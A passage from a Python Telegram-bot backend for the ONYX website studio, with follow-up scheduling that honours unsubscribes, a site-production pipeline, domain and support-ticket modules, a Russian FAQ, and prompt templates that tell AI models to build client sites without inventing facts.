    l = lead_get(uid) or {}
    if l.get("followups_off"):
        return None
    d = FOLLOWUP_DEFS.get(ftype)
    if not d or has_active_followup(uid, ftype):
        return None
    fid = _redis("INCR", "onyx:followup_seq") if KV_URL else (_MEM.get("_followup_seq", 0) + 1)
    if not KV_URL:
        _MEM["_followup_seq"] = fid
    f = {"followup_id": fid, "telegram_id": uid, "type": ftype,
         "message_text": d["text"], "status": "scheduled",
         "scheduled_ts": _ts() + d["delay"], "scheduled_at": now_str(),
         "sent_at": "", "result": "", "created_at": now_str()}
    followups_index_add(fid)
    followup_save(f)
    sheet_followup(f)
    return f


def cancel_followups(uid, ftypes=None):
    """Отменить запланированные дожимы (например, при оплате/завершении анкеты)."""
    n = 0
    for fid in all_followup_ids():
        f = followup_get(fid)
        if not f or f.get("telegram_id") != uid or f.get("status") != "scheduled":
            continue
        if ftypes and f.get("type") not in ftypes:
            continue
        f["status"] = "cancelled"
        followup_save(f)
        n += 1
    return n


def sheet_followup(f):
    sheet_post("FollowUps", {
        "followup_id": f.get("followup_id", ""), "telegram_id": f.get("telegram_id", ""),
        "type": f.get("type", ""), "message_text": f.get("message_text", ""),
        "status": f.get("status", ""), "scheduled_at": f.get("scheduled_at", ""),
        "sent_at": f.get("sent_at", ""), "result": f.get("result", ""),
        "created_at": f.get("created_at", ""),
    })


def _fu_sent_today(uid):
    k = f"onyx:fu_sent:{uid}:{_today_key()}"
    if KV_URL:
        v = _redis("GET", k)
        return int(v) if v else 0
    return _MEM.get(k, 0)


def _fu_bump_sent(uid):
    k = f"onyx:fu_sent:{uid}:{_today_key()}"
    if KV_URL:
        _redis("INCR", k); _redis("EXPIRE", k, str(DAY * 2))
    else:
        _MEM[k] = _MEM.get(k, 0) + 1


def run_followups():
    """Cron: разослать созревшие дожимы (с учётом лимитов и отписок)."""
    now = _ts()
    n = 0
    for fid in all_followup_ids():
        f = followup_get(fid)
        if not f or f.get("status") != "scheduled":
            continue
        if f.get("scheduled_ts", 0) > now:
            continue
        uid = f["telegram_id"]
        l = lead_get(uid) or {}
        # оплатил/сконвертился/отключены дожимы - снимаем
        if l.get("followups_off") or l.get("lead_status") in ("paid", "converted"):
            f["status"] = "cancelled"; followup_save(f); continue
        # маркетинговые нельзя отписавшимся; сервисные можно
        if f["type"] in FU_MARKETING and not is_subscribed(uid):
            f["status"] = "cancelled"; f["result"] = "unsubscribed"; followup_save(f); continue
        if _fu_sent_today(uid) >= FU_DAILY_LIMIT:
            continue  # попробуем завтра
        d = FOLLOWUP_DEFS.get(f["type"], {})
        ok = safe_send(uid, f["message_text"], d.get("kb"))
        f["status"] = "sent" if ok else "failed"
        f["sent_at"] = now_str()
        f["result"] = "delivered" if ok else "blocked"
        followup_save(f)
        if ok:
            _fu_bump_sent(uid)
            l["follow_up_count"] = l.get("follow_up_count", 0) + 1
            lead_save(l)
            n += 1
    return n


def is_subscribed(uid):
    if KV_URL:
        return bool(_redis("SISMEMBER", "onyx:subscribers", str(uid)))
    return uid in _MEM.get("_subs", set())


# ============================================================================
#  ЭТАП 14: ПРОИЗВОДСТВЕННЫЙ КОНВЕЙЕР (ProductionSites)
# ============================================================================
PROD_STAGES = ["new", "materials", "base_generation", "github", "design",
               "review", "vercel", "domain", "final_check", "delivered"]


def prod_index_add(oid):
    if KV_URL:
        _redis("RPUSH", "onyx:prod_all", str(oid))
    else:
        _MEM.setdefault("_prod_all", []).append(oid)


def all_prod_ids():
    if KV_URL:
        r = _redis("LRANGE", "onyx:prod_all", "-200", "-1") or []
        return [int(x) for x in r if str(x).isdigit()]
    return _MEM.get("_prod_all", [])


def prod_get(oid):
    return _get(f"onyx:prod:{oid}")


def prod_save(pr):
    pr["updated_at"] = now_str()
    _set(f"onyx:prod:{pr['order_id']}", pr, ttl=YEAR)
    sheet_prod(pr)
    return pr


def sheet_prod(pr):
    sheet_post("ProductionSites", {k: pr.get(k, "") for k in [
        "production_id", "order_id", "telegram_id", "client_name", "niche", "website_type",
        "questionnaire_status", "materials_status", "base_generation_status", "github_status",
        "github_repo_url", "design_required", "design_status", "claude_task_status",
        "vercel_status", "vercel_preview_url", "production_url", "domain_status", "domain_name",
        "final_check_status", "client_approval_status", "responsible_developer", "deadline",
        "internal_comment", "created_at", "updated_at"]})


def production_create(order):
    """Создаётся автоматически при оплате заказа."""
    oid = order["id"]
    if prod_get(oid):
        return prod_get(oid)
    uid = order.get("uid")
    p = user_get(uid) or {}
    items = order.get("items", [])
    design = any(i in ("design",) for i in items)
    pr = {
        "production_id": f"P{oid}", "order_id": oid, "telegram_id": uid,
        "client_name": p.get("name", ""), "niche": p.get("niche", ""),
        "website_type": "shop" if any(i in ("cart", "catalog") for i in items) else "site",
        "questionnaire_status": p.get("questionnaire_status", "not_filled"),
        "materials_status": "requested", "base_generation_status": "not_started",
        "github_status": "not_created", "github_repo_url": "",
        "design_required": "yes" if design else "no",
        "design_status": "waiting" if design else "not_required",
        "claude_task_status": "not_created", "vercel_status": "not_deployed",
        "vercel_preview_url": "", "production_url": "",
        "domain_status": "not_started", "domain_name": p.get("website", ""),
        "final_check_status": "not_started", "client_approval_status": "not_sent",
        "responsible_developer": "", "deadline": "", "internal_comment": "",
        "stage": "new", "created_at": now_str(), "updated_at": now_str()}
    prod_index_add(oid)
    prod_save(pr)
    create_task("production", oid, f"Начать производство сайта (заказ №{oid})",
                description=f"Ниша: {p.get('niche', '-')}. Услуги: {', '.join(items)}",
                telegram_id=uid, order_id=oid, priority="high")
    if design:
        create_design_task(order, pr)
    return pr


def prod_bucket(bucket):
    out = []
    for oid in all_prod_ids():
        pr = prod_get(oid)
        if not pr:
            continue
        stage = pr.get("stage", "new")
        if bucket == "new" and stage == "new":
            out.append(pr)
        elif bucket == "in_work" and stage not in ("new", "delivered"):
            out.append(pr)
        elif bucket == "design" and pr.get("design_required") == "yes" and pr.get("design_status") in ("waiting", "in_progress", "review"):
            out.append(pr)
        elif bucket == "ready" and stage in ("final_check", "delivered"):
            out.append(pr)
        elif bucket == "all":
            out.append(pr)
    return out


def admin_prod_text():
    buckets = [("new", "🆕 Новые"), ("in_work", "🔧 В работе"),
               ("design", "🎨 Требуют дизайна"), ("ready", "✅ Готовы к сдаче")]
    lines = ["🏭 <b>Производство сайтов</b>\n"]
    rows = []
    for key, label in buckets:
        items = prod_bucket(key)
        lines.append(f"{label}: {len(items)}")
    for pr in prod_bucket("all")[-12:]:
        rows.append([{"text": f"№{pr['order_id']} · {pr.get('client_name', '-')[:18]} · {pr.get('stage')}",
                      "callback_data": f"prod:v:{pr['order_id']}"}])
    rows.append([{"text": "⬅️ Назад", "callback_data": "adm:home"}])
    return "\n".join(lines), {"inline_keyboard": rows}


def admin_prod_detail(pr):
    lines = [f"🏭 <b>Проект №{pr['order_id']}</b> ({pr.get('production_id')})", "",
             f"Клиент: {pr.get('client_name', '-')} (id {pr.get('telegram_id')})",
             f"Ниша: {pr.get('niche', '-')} · Тип: {pr.get('website_type')}",
             f"Этап: <b>{pr.get('stage')}</b>",
             f"Материалы: {pr.get('materials_status')}",
             f"База: {pr.get('base_generation_status')} · GitHub: {pr.get('github_status')}",
             f"Дизайн: {pr.get('design_required')}/{pr.get('design_status')}",
             f"Vercel: {pr.get('vercel_status')} · Домен: {pr.get('domain_status')}",
             f"Проверка: {pr.get('final_check_status')} · Аппрув клиента: {pr.get('client_approval_status')}"]
    if pr.get("github_repo_url"):
        lines.append(f"Repo: {pr['github_repo_url']}")
    if pr.get("vercel_preview_url"):
        lines.append(f"Preview: {pr['vercel_preview_url']}")
    oid = pr["order_id"]
    kb = {"inline_keyboard": [
        [{"text": "▶️ Сменить этап", "callback_data": f"prod:stage:{oid}"}],
        [{"text": "🔗 + GitHub URL", "callback_data": f"prod:set:github:{oid}"},
         {"text": "🌐 + Vercel", "callback_data": f"prod:set:vercel:{oid}"}],
        [{"text": "🔤 + Домен", "callback_data": f"prod:set:domain:{oid}"},
         {"text": "🌍 + Финальный URL", "callback_data": f"prod:set:site:{oid}"}],
        [{"text": "📤 Запросить материалы", "callback_data": f"prod:materials:{oid}"}],
        [{"text": "👀 На проверку клиенту", "callback_data": f"prod:approve:{oid}"},
         {"text": "💬 Написать клиенту", "callback_data": f"prod:msg:{oid}"}],
        [{"text": "🎉 Завершить проект", "callback_data": f"prod:finish:{oid}"}],
        [{"text": "⬅️ К производству", "callback_data": "adm:prod"}],
    ]}
    return "\n".join(lines), kb


# --- Шаблон промпта для Claude Code (индивидуальный дизайн) ---
DESIGN_PROMPT_TEMPLATE = (
    "Ты работаешь как senior UI/UX designer и frontend-разработчик ONYX.\n\n"
    "Перед тобой уже существующий сайт клиента. Его структура, тексты, формы и бизнес-логика "
    "уже подготовлены. Твоя задача - улучшить только визуальный дизайн сайта.\n\n"
    "Нельзя: менять смысл текстов; удалять формы заявок; ломать адаптив; менять структуру "
    "блоков без необходимости; удалять CTA; удалять контактные данные; добавлять выдуманные "
    "факты, отзывы, лицензии, цифры.\n\n"
    "Нужно: улучшить первый экран; улучшить типографику; настроить отступы; сделать карточки "
    "современнее; улучшить мобильную версию; добавить аккуратные hover-эффекты; привести сайт "
    "к более дорогому визуальному уровню; сохранить чистый код; проверить адаптивность; "
    "создать pull request или отдельную ветку.\n\n"
    "Данные клиента:\nНиша: {niche}\nГород: {city}\nПожелания по стилю: {style}\n"
    "Цвета: {colors}\nРеференсы: {refs}\nGitHub: {github}\nPreview: {preview}\n\n"
    "После выполнения дай отчёт: что изменено; какие файлы изменены; что проверить перед merge."
)


def build_design_prompt(order, pr):
    uid = order.get("uid")
    q = _get(f"onyx:quest:{uid}") or {}
    p = user_get(uid) or {}
    return DESIGN_PROMPT_TEMPLATE.format(
        niche=p.get("niche") or q.get("niche", "-"), city=q.get("city", "-"),
        style=q.get("style_preferences", "-"), colors=q.get("color_preferences", "-"),
        refs=q.get("reference_sites", "-"),
        github=pr.get("github_repo_url", "-"), preview=pr.get("vercel_preview_url", "-"))


def create_design_task(order, pr):
    """ТЗ: при INDIVIDUAL_CLAUDE после базовой версии - задача Claude на UI/UX
    с GitHub URL и Preview URL, без изменения структуры/контента/логики."""
    oid = order["id"]
    uid = order.get("uid")
    d = _get(f"onyx:quest:{uid}") or {}
    p = user_get(uid) or {}
    prof = TARIFF_PROFILES.get(p.get("chosen_tariff") or "start", TARIFF_PROFILES["start"])
    brief = (
        f"ЗАДАЧА CLAUDE - ИНДИВИДУАЛЬНЫЙ ДИЗАЙН (оплачен клиентом)\n"
        f"Заказ №{oid} · клиент id {uid} · {d.get('company_name', '-')}\n"
        f"Профиль тарифа: {prof['code']} «{prof['name']}»\n"
        f"GitHub: {pr.get('github_repo_url') or '- укажите после создания репозитория -'}\n"
        f"Preview (Vercel): {pr.get('vercel_preview_url') or '- укажите после деплоя -'}\n\n"
        f"Ниша: {d.get('niche', '-')} · Город: {d.get('city', '-')}\n"
        f"Стиль: {d.get('style_preferences', '-')} · Цвета: {d.get('color_preferences', '-')}\n"
        f"Референсы: {d.get('reference_sites', '-')}\n"
        f"Нельзя: {d.get('must_not_have', '-')}\n\n"
        "ЗАПРЕТЫ: не менять структуру секций, тексты, факты, формы и бизнес-логику. "
        "Улучшать только визуал: сетка, типографика, композиция, карточки, состояния, "
        "адаптив, аккуратные анимации. Результат - pull request или отдельная ветка."
    )
    create_task("production", f"design-{oid}", f"Claude: индивидуальный дизайн (заказ №{oid})",
                description=brief, telegram_id=uid, order_id=oid, priority="high")
    pr["claude_task_status"] = "created"
    prod_save(pr)
    notify_admins(f"🎨 <b>Задача Claude на индивидуальный дизайн</b>\nЗаказ №{oid} · id {uid}\n"
                  "Добавьте ссылки: /drive и prod:set (GitHub/Vercel), затем передайте бриф в Claude Code.")


# ============================================================================
#  ЭТАП 15: ДОМЕННЫЙ МОДУЛЬ (Domains)
# ============================================================================
DOMAIN_INSTRUCTION = (
    "🌐 <b>Как подключить домен</b>\n\n"
    "1. Если домен уже есть - отправьте нам его название.\n"
    "2. Если домена нет - напишите 2-3 желаемых варианта.\n"
    "3. Мы проверим свободность.\n"
    "4. Домен регистрируется на ваши данные.\n"
    "5. ONYX помогает настроить DNS и подключить сайт.\n\n"
    "<i>Домен должен быть оформлен на вас или вашу компанию. ONYX помогает с подбором, "
    "подключением и технической настройкой, но владельцем домена остаётесь вы.</i>"
)


def domain_get(uid):
    return _get(f"onyx:domain:{uid}")


def domain_save(d):
    d["updated_at"] = now_str()
    _set(f"onyx:domain:{d['telegram_id']}", d, ttl=YEAR)
    sheet_domain(d)
    return d


def sheet_domain(d):
    sheet_post("Domains", {k: d.get(k, "") for k in [
        "domain_id", "telegram_id", "order_id", "domain_name", "domain_status", "owner_type",
        "registrar", "client_has_access", "dns_status", "nameserver_status",
        "connected_to_vercel", "renewal_date", "internal_comment", "created_at", "updated_at"]})


def domain_from_questionnaire(uid, data, order_id=""):
    """По ответам анкеты завести доменную запись и задачу команде."""
    has = data.get("has_domain")
    name = data.get("domain_name", "")
    if has == "Да, есть" and name:
        status, task_title = "client_has_domain", f"Проверить домен клиента: {name}"
    elif has == "Нет":
        status, task_title = "need_register", "Помочь клиенту зарегистрировать домен"
    else:
        return None
    d = {"domain_id": f"D{uid}", "telegram_id": uid, "order_id": order_id,
         "domain_name": name, "domain_status": status, "owner_type": "unknown",
         "registrar": "", "client_has_access": "", "dns_status": "not_started",
         "nameserver_status": "", "connected_to_vercel": "no", "renewal_date": "",
         "internal_comment": "", "created_at": now_str(), "updated_at": now_str()}
    domain_save(d)
    create_task("domain", uid, task_title, telegram_id=uid, order_id=order_id, priority="normal")
    if status == "need_register":
        add_tag(uid, "domain_help_needed")
    return d


# ============================================================================
#  ЭТАП 16: ТИКЕТЫ ПОДДЕРЖКИ + FAQ
# ============================================================================
TICKET_CATS = [("site", "🌐 Сайт"), ("payment", "💳 Оплата"), ("domain", "🔤 Домен"),
               ("request", "📝 Заявка"), ("tech", "🐞 Техническая ошибка"), ("other", "❓ Другое")]
TICKET_CAT_RU = dict(TICKET_CATS)
TICKET_STATUS_RU = {"new": "🆕 Новое", "in_progress": "🔧 В работе",
                    "answered": "💬 Отвечено", "closed": "✅ Закрыто"}


def tickets_index_add(tid):
    if KV_URL:
        _redis("RPUSH", "onyx:tickets_all", str(tid))
    else:
        _MEM.setdefault("_tickets_all", []).append(tid)


def all_ticket_ids():
    if KV_URL:
        r = _redis("LRANGE", "onyx:tickets_all", "-200", "-1") or []
        return [int(x) for x in r if str(x).isdigit()]
    return _MEM.get("_tickets_all", [])


def ticket_get(tid):
    return _get(f"onyx:ticket:{tid}")


def ticket_save(t):
    t["updated_at"] = now_str()
    _set(f"onyx:ticket:{t['ticket_id']}", t, ttl=YEAR)
    sheet_ticket(t)
    return t


def sheet_ticket(t):
    sheet_post("SupportTickets", {
        "ticket_id": t.get("ticket_id", ""), "telegram_id": t.get("telegram_id", ""),
        "order_id": t.get("order_id", ""), "category": t.get("category", ""),
        "message": t.get("message", ""), "status": t.get("status", ""),
        "priority": t.get("priority", ""), "assigned_to": t.get("assigned_to", ""),
        "last_answer": t.get("last_answer", ""),
        "created_at": t.get("created_at", ""), "updated_at": t.get("updated_at", ""),
    })


def ticket_create(uid, username, category, message):
    tid = _redis("INCR", "onyx:ticket_seq") if KV_URL else (_MEM.get("_ticket_seq", 0) + 1)
    if not KV_URL:
        _MEM["_ticket_seq"] = tid
    o = active_order(uid)
    t = {"ticket_id": tid, "telegram_id": uid, "username": username or "",
         "order_id": (o or {}).get("id", ""), "category": category, "message": message,
         "status": "new", "priority": "normal", "assigned_to": "", "last_answer": "",
         "created_at": now_str(), "updated_at": now_str()}
    tickets_index_add(tid)
    ticket_save(t)
    uname = f"@{username}" if username else "-"
    notify_admins("🆘 <b>Новое обращение в поддержку ONYX</b>\n"
                  f"Обращение #{tid}\nКатегория: {TICKET_CAT_RU.get(category, category)}\n"
                  f"Сообщение: {message}\nTelegram: {uname} (id {uid})\n"
                  f"Order ID: {t['order_id'] or '-'}")
    create_task("support", uid, f"Ответить на обращение #{tid} ({TICKET_CAT_RU.get(category, category)})",
                description=message, telegram_id=uid, order_id=t["order_id"], priority="high", notify=False)
    return t


def user_tickets(uid):
    return [ticket_get(t) for t in all_ticket_ids() if (ticket_get(t) or {}).get("telegram_id") == uid]


FAQ = [
    ("Почему сайт бесплатно?", "Разработка базового сайта - 0 ₽. ONYX зарабатывает на запуске "
     "и доп.опциях, а базовый сайт делаем бесплатно, чтобы вам было легко начать."),
    ("За что платит клиент?", "За запуск (домен, хостинг, публикация) и дополнительные опции по "
     "желанию (CRM, каталог, дизайн и т.д.). Оплата - по счёту."),
    ("Что входит в запуск?", "Домен, хостинг, SSL, публикация сайта в интернете и первичная "
     "техническая поддержка."),
    ("Как оплатить разработку и допопции?", "Оплата - по счёту (реквизитам): банковским переводом "
     "через мобильный банк, по СБП или через сервис оплаты по реквизитам на Госуслугах. Счёт может "
     "быть выставлен от одного из двух партнёров ONYX. После оплаты вы получаете официальный чек в "
     "приложении «Мой налог» в соответствии с 422-ФЗ."),
    ("Когда нужно платить?", "Не сразу. Сначала мы разрабатываем сайт и показываем вам. Оплата "
     "требуется только после того, как вы утвердите готовый сайт. Итоговая сумма фиксируется в "
     "счёте до начала работ."),
    ("Кто владелец домена?", "Домен оформляется на вас или вашу компанию. ONYX помогает с подбором, "
     "регистрацией и настройкой, но владельцем остаётесь вы."),
    ("Как проходит разработка сайта?", "Вы заполняете анкету → мы готовим структуру и собираем сайт "
     "→ проверяем → подключаем домен → сдаём вам. Статус виден в разделе «Мой заказ»."),
    ("Сколько времени занимает запуск?", "Обычно базовый сайт готов за 1-3 рабочих дня после "
     "получения материалов и оплаты."),
    ("Можно ли подключить заявки с сайта?", "Да. Форма заявки входит во все тарифы; можно добавить "
     "Telegram-уведомления, онлайн-запись, корзину, каталог или CRM-интеграцию (см. «Доп. опции»)."),
    ("Можно ли подключить CRM?", "Да, есть опция «CRM-интеграция» (от 7 900 ₽) - заявки попадают в "
     "вашу CRM или таблицу заявок автоматически. Уже входит в тариф «Сайт как система продаж»."),
    ("Что делать, если уже есть сайт?", "Сделаем бесплатный аудит и предложим, что улучшить, "
     "или соберём новый сайт."),
    ("Что делать, если уже есть домен?", "Отправьте нам его название - мы подключим сайт к вашему "
     "домену без переоформления."),
    ("Как связаться с поддержкой?", "Раздел «🆘 Поддержка» → «Создать обращение» или напишите "
     "менеджеру напрямую."),
    ("Как стать партнёром?", "Раздел «🤝 Стать партнёром» - заполните короткую заявку и получите "
     "партнёрский код."),
]


def faq_menu_kb():
    rows = [[{"text": f"{i+1}. {q}", "callback_data": f"faq:{i}"}] for i, (q, _) in enumerate(FAQ)]
    rows.append([{"text": "💬 Связаться с поддержкой", "callback_data": "sup:new"}])
    rows.append([{"text": "⬅️ Назад", "callback_data": "sup:back"}])
    return {"inline_keyboard": rows}


# ============================================================================
#  ЭТАП 17: КОММЕРЧЕСКИЕ ПРЕДЛОЖЕНИЯ ПОСЛЕ АУДИТА (AuditOffers)
# ============================================================================
def offer_get(uid):
    return _get(f"onyx:offer:{uid}")


def offer_save(o):
    o["updated_at"] = now_str()
    _set(f"onyx:offer:{o['telegram_id']}", o, ttl=YEAR)
    sheet_offer(o)
    return o


def sheet_offer(o):
    sheet_post("AuditOffers", {
        "offer_id": o.get("offer_id", ""), "audit_id": o.get("audit_id", ""),
        "telegram_id": o.get("telegram_id", ""), "website_url": o.get("website_url", ""),
        "problems": o.get("problems", ""), "recommended_services": o.get("recommended_services", ""),
        "onyx_price": o.get("onyx_price", ""), "market_comparison": o.get("market_comparison", ""),
        "offer_status": o.get("offer_status", ""),
        "created_at": o.get("created_at", ""), "updated_at": o.get("updated_at", ""),
    })


def offer_create(a):
    o = {"offer_id": f"O{a.get('audit_id')}", "audit_id": a.get("audit_id", ""),
         "telegram_id": a.get("telegram_id"), "website_url": a.get("website_url", ""),
         "problems": a.get("weak_points", ""), "recommended_services": a.get("recommended_services", ""),
         "onyx_price": a.get("estimated_onyx_price", ""), "market_comparison": a.get("market_price_comparison", ""),
         "offer_status": "generated", "created_at": now_str(), "updated_at": now_str()}
    return offer_save(o)


# ============================================================================
#  ONYX SITE FACTORY 4.0 - конвейер производства сайтов
#  Регламент: анкета → Sheets → Drive → Prompt №1..№6 → QA → публикация.
#  Промпты хранятся здесь как ACTIVE-версии (дублируются в Sheets/PROMPT_LIBRARY).
# ============================================================================
FACTORY_STATUSES = [
    "qualified", "waiting_questionnaire", "waiting_materials", "data_ready",
    "prompt1_ready", "site_created", "ux_done", "design_done", "tech_qa_passed",
    "ready_to_present", "changes_received", "changes_applied", "final_qa",
    "waiting_payment", "paid", "publishing", "published",
]
FACTORY_STATUS_RU = {
    "qualified": "✅ Квалифицирован", "waiting_questionnaire": "📝 Ожидаем анкету",
    "waiting_materials": "📎 Ожидаем материалы", "data_ready": "📊 Данные готовы",
    "prompt1_ready": "🧠 Prompt №1 готов", "site_created": "🌐 Сайт создан",
    "ux_done": "🎯 UX готов", "design_done": "🎨 Дизайн готов",
    "tech_qa_passed": "🔧 Tech QA пройден", "ready_to_present": "👀 Готов к презентации",
    "changes_received": "✏️ Правки получены", "changes_applied": "✅ Правки внесены",
    "final_qa": "🔍 Финальный QA", "waiting_payment": "🧾 Ожидаем оплату",
    "paid": "💰 Оплачено", "publishing": "🚀 Публикация", "published": "🎉 Опубликован",
}

# Колонки листа Factory (порядок как в регламенте, п.6)
FACTORY_COLUMNS = [
    "Lead_ID", "company_name", "niche", "city", "geo", "services", "priority_service",
    "target_audience", "avg_check", "typical_request", "objections", "advantages",
    "guarantees", "experience", "stages", "CTA", "show_prices", "special_offer",
    "phone", "messengers", "email", "address", "working_hours", "social_links",
    "design_style", "colors", "references", "must_have", "must_not_have",
    "seo_queries", "additional_functions", "has_domain", "domain_name",
    "logo_url", "portfolio_urls", "reviews_url", "documents_url", "photos_url",
    "has_logo", "has_photos", "has_portfolio", "has_reviews", "documents",
    "missing_data", "factory_status", "PROMPT_1_READY", "created_at", "updated_at",
]

# Подпапки Google Drive на клиента (регламент, п.4)
DRIVE_FOLDERS = [
    "01_Анкета", "02_Логотип_и_бренд", "03_Фото_компании", "04_Портфолио",
    "05_Отзывы", "06_Документы_и_сертификаты", "07_Видео", "08_Готовый_контент",
    "09_Презентация_клиенту",
]

# ============================================================================
#  ГЕНЕРАТОР 6 ПРОИЗВОДСТВЕННЫХ ПРОМПТОВ (ТЗ: 6 шаблонов × 3 профиля × режимы)
#  Структура промптов ФИКСИРОВАНА. Свободная генерация запрещена.
# ============================================================================
PROMPTS_VERSION = "1.0"

# Профили тарифов: что разрешено собирать на каждом уровне
TARIFF_PROFILES = {
    "start": {
        "code": "TARIFF_1", "name": "Старт онлайн",
        "structure": "одностраничный сайт (лендинг): первый экран с оффером, услуги/товары, "
                     "о компании, преимущества, контакты, простая форма заявки",
        "design_level": "чистый современный базовый дизайн, аккуратная типографика, "
                        "сдержанные акценты, без сложных анимаций",
        "tech_level": "адаптив под телефон/планшет/ПК, базовые мета-теги, H1, семантика, "
                      "быстрая загрузка, работающая форма",
        "features": "простая форма заявки, кнопки связи (телефон, мессенджер)",
        "limits": "не добавлять многостраничность, каталог, CRM, аналитику, корзину, "
                  "онлайн-запись и калькулятор - они не входят в этот тариф",
    },
    "leads": {
        "code": "TARIFF_2", "name": "Сайт + заявки",
        "structure": "усиленный лендинг под заявки: доработанный первый экран и оффер, услуги, "
                     "блок доверия (отзывы/гарантии/кейсы/преимущества), FAQ для закрытия "
                     "возражений, карта/геосервис, контакты, усиленная форма заявки",
        "design_level": "выразительный дизайн уровня хорошей студии: продуманная сетка, "
                        "иерархия, качественные карточки и состояния, аккуратные hover-эффекты",
        "tech_level": "адаптив, мета-теги, Open Graph, семантика, базовые цели аналитики, "
                      "валидация формы, состояния успеха/ошибки, оптимизация изображений",
        "features": "форма заявки, Telegram-уведомления о заявках, Яндекс Метрика + базовые цели, "
                    "карта/геосервис",
        "limits": "не добавлять CRM-интеграцию, корзину, каталог, онлайн-запись и калькулятор, "
                  "если они не куплены отдельно",
    },
    "system": {
        "code": "TARIFF_3", "name": "Сайт как система продаж",
        "structure": "расширенная структура: первый экран, услуги с раскрытием, дополнительные "
                     "продающие блоки, доверие, кейсы/портфолио, FAQ, блок целевого действия, "
                     "контакты; при наличии опций - каталог/онлайн-запись/калькулятор",
        "design_level": "премиальный индивидуализированный дизайн: сильная композиция, "
                        "продуманный визуальный ритм, работа с реальными фото клиента",
        "tech_level": "полная техническая проработка: адаптив, SEO-структура, Open Graph, "
                      "расширенная аналитика с целями и событиями, доступность, скорость",
        "features": "усиленная логика заявок, CRM-интеграция или таблица заявок, расширенная "
                    "аналитика, онлайн-запись ИЛИ калькулятор (по выбору клиента)",
        "limits": "включать только то, что входит в тариф или куплено отдельно",
    },
}

# Общие правила ONYX - во всех 6 промптах
ONYX_COMMON_RULES = """ОБЩИЕ ПРАВИЛА ONYX (обязательны на всех этапах):
- Запрещено выдумывать факты: отзывы, кейсы, цифры, сроки, гарантии, сертификаты, лицензии,
  количество сотрудников, объекты, награды и любые достижения.
- Использовать только данные клиента из входных данных и приложенные материалы.
- Если данных не хватает - пометить [НУЖНЫ ДАННЫЕ] и не заполнять выдумкой.
- Сайт ведёт к одному главному целевому действию.
- Контакты на сайте должны точно совпадать с данными клиента.
- Не оставлять lorem ipsum, заглушки, тестовые данные и технические комментарии.
- Не добавлять функции, которые не входят в тариф и не куплены отдельно."""

CONTENT_MODE_RULES = {
    "FULL_CONTENT": "РЕЖИМ КОНТЕНТА: FULL_CONTENT.\n"
                    "У клиента есть тексты, фото, логотип, контакты, услуги и подтверждённые факты.\n"
                    "Используй материалы клиента как основу. Не заменяй реальные данные общими фразами.",
    "PARTIAL_CONTENT": "РЕЖИМ КОНТЕНТА: PARTIAL_CONTENT.\n"
                       "Часть материалов есть, часть отсутствует. Используй то, что есть.\n"
                       "Для недостающего - сформируй список конкретно недостающих материалов "
                       "и пометь места [НУЖНЫ ДАННЫЕ]. Не заполняй пробелы выдуманными фактами.",
    "NO_CONTENT": "РЕЖИМ КОНТЕНТА: NO_CONTENT.\n"
                  "Есть только минимальные данные о бизнесе. Разрешено создавать нейтральные "
                  "черновые тексты (описания услуг общего характера, структурные заголовки).\n"
                  "СТРОГО ЗАПРЕЩЕНО выдумывать: отзывы, кейсы, цифры, сертификаты, сотрудников, "
                  "объекты, опыт, гарантии. Все такие блоки помечать [НУЖНЫ ДАННЫЕ].",
}

DESIGN_MODE_RULES = {
    "STANDARD": "РЕЖИМ ДИЗАЙНА: STANDARD.\n"
                "Базовый дизайн Google AI Studio по стандартам выбранного тарифа. "
                "Опция «Индивидуальный дизайн» не оплачена - не обещать уникальную концепцию.",
    "INDIVIDUAL_CLAUDE": "РЕЖИМ ДИЗАЙНА: INDIVIDUAL_CLAUDE.\n"
                         "Клиент оплатил индивидуальный дизайн. На этом этапе собери качественную "
                         "базовую версию; далее отдельной задачей Claude улучшит UI/UX, "
                         "НЕ меняя структуру, контент и бизнес-логику.",
}

# 6 фиксированных мастер-шаблонов (структура из ТЗ п.8)
MASTER_TEMPLATES = {
    1: {"name": "Архитектура",
        "role": "Ты - UX-архитектор и стратег сайтов для бизнеса.",
        "goal": "Спроектировать структуру сайта: страницы, секции, порядок блоков, целевые действия. "
                "Код на этом этапе не пишешь.",
        "output": "1. Позиционирование компании в 2-3 предложениях.\n"
                  "2. Целевая аудитория, её боли и возражения.\n"
                  "3. Главное целевое действие и путь к нему.\n"
                  "4. Карта сайта: перечень секций по порядку, задача каждой секции.\n"
                  "5. Для каждой секции: заголовок, смысл, какие факты клиента использовать, CTA.\n"
                  "6. Карта доверия: чем закрываем сомнения (отзывы, гарантии, опыт, портфолио).\n"
                  "7. Карта использования материалов: какие фото/файлы в каких секциях.\n"
                  "8. Список недостающих данных.",
        "next": "Готовая структура передаётся в промпт №2 (Персонализация) как основа контента.",
        "criteria": "Структуру можно передать в разработку без устных пояснений; "
                    "она соответствует составу тарифа и ведёт к одному главному CTA."},
    2: {"name": "Персонализация",
        "role": "Ты - conversion copywriter и специалист по контенту для сайтов бизнеса.",
        "goal": "Наполнить утверждённую структуру реальным контентом клиента: офферы, описания услуг, "
                "тексты блоков, FAQ, контакты.",
        "output": "1. Первый экран: заголовок-оффер + 3 варианта подзаголовка + текст кнопки.\n"
                  "2. Тексты всех секций по структуре из промпта №1.\n"
                  "3. Описания услуг с пользой для клиента.\n"
                  "4. Блок доверия на реальных фактах клиента.\n"
                  "5. FAQ: вопросы-возражения и ответы.\n"
                  "6. Контактный блок с точными данными клиента.\n"
                  "7. Список мест, помеченных [НУЖНЫ ДАННЫЕ].",
        "next": "Контент передаётся в промпт №3 (Дизайн) для визуального воплощения.",
        "criteria": "Тексты персонализированы под компанию и нишу, не содержат выдуманных фактов, "
                    "закрывают возражения и ведут к целевому действию."},
    3: {"name": "Дизайн",
        "role": "Ты - senior UI/UX designer и frontend-разработчик.",
        "goal": "Собрать визуальную версию сайта: вёрстка, типографика, композиция, адаптив.",
        "output": "1. Рабочий код сайта со всеми секциями из структуры и контентом из промпта №2.\n"
                  "2. Адаптивная вёрстка: телефон, планшет, компьютер.\n"
                  "3. Рабочие кнопки, меню, якоря, форма заявки.\n"
                  "4. Использование реальных изображений клиента в нужных секциях.\n"
                  "5. Краткое описание принятых дизайн-решений (палитра, шрифты, ритм).",
        "next": "Собранный сайт передаётся в промпт №4 (Оптимизация).",
        "criteria": "Сайт открывается целиком, выглядит профессионально на всех экранах, "
                    "все элементы работают, дизайн соответствует уровню тарифа."},
    4: {"name": "Оптимизация",
        "role": "Ты - senior frontend engineer и SEO-специалист.",
        "goal": "Оптимизировать код, скорость, SEO-основу и доступность без изменения дизайна и смысла.",
